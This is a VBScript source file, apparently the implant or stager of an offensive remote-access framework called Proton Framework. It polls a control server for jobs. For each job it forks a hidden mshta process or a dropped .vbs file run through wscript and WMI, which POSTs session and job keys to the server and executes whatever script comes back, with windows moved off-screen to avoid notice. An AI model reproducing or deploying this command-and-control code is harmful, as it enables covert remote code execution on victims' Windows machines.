'            ---------------------------------------------------
'                             Proton Framework              
'            ---------------------------------------------------
'                Copyright (C) <2019-2020>  <Entynetproject>
'
'        This program is free software: you can redistribute it and/or modify
'        it under the terms of the GNU General Public License as published by
'        the Free Software Foundation, either version 3 of the License, or
'        any later version.
'
'        This program is distributed in the hope that it will be useful,
'        but WITHOUT ANY WARRANTY; without even the implied warranty of
'        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
'        GNU General Public License for more details.
'
'        You should have received a copy of the GNU General Public License
'        along with this program.  If not, see <http://www.gnu.org/licenses/>.

Sub ForkWorkMSHTA(jobkey)
    cmd = "mshta vbscript:Execute(""window.blur:window.moveTo -2000,-2000:on error resume next:Set x=CreateObject(""""WinHttp.WinHttpRequest.5.1""""):"
    cmd = cmd & "x.open""""POST"""",""""" & jobpath & """"",false:"
    cmd = cmd & "x.setRequestHeader""""sessionkey"""",""""" & sessionkey & """"":"
    cmd = cmd & "x.setRequestHeader""""jobkey"""",""""" & jobkey & """"":"
    cmd = cmd & "x.send:Execute x.responseText"")(window.close)"


    'kows.Run cmd, 0, false
    KoExecWMI cmd
End Sub

Sub ForkWorkWscript(jobkey)
    path = KoGetPath("~DIRECTORY~/~FILE~1.vbs")

    data = "on error resume next:Set x=CreateObject(""Microsoft.XMLHTTP""):x.open""POST"",""" & jobpath & """,false:"
    data = data & "x.setRequestHeader""sessionkey"",""" & sessionkey & """:"
    data = data & "x.setRequestHeader""jobkey"",""" & jobkey & """:"
    data = data & "x.send:Execute x.responseText"

    KoWriteFile path, data

    cmd = "cmd /q /c start wscript " & path
    kows.Run cmd, 0, false
end Sub

Sub ForkWork(jobkey)
    if isobject(Wscript) then
        ForkWorkWscript jobkey
    else
        ForkWorkMSHTA jobkey
    end if
end sub

Sub DoWork
    on error resume next
    set work = KoGetWork()
    if err.number = 0 then
        if work.status = 201 then
            jobkey = work.responseText
            ForkWork jobkey
        end if
    else
        KoSleep 10
    end if
End Sub

Sub DoWorkTimeOut
    on error resume next
    for i = 0 to 2
      DoWork
    next
    ForkWork "stage"
    KoSleep 5
    KoExit

    'timeouthandle = window.setTimeout(GetRef("DoWorkTimeOut"), 0)', "VBScript")
end Sub

Sub DoWorkLoop
    on error resume next
    do while True
        DoWork
    Loop
end Sub

if isobject(window) then
    'window.stop
    doworktimeout
else
    doworkloop
end if
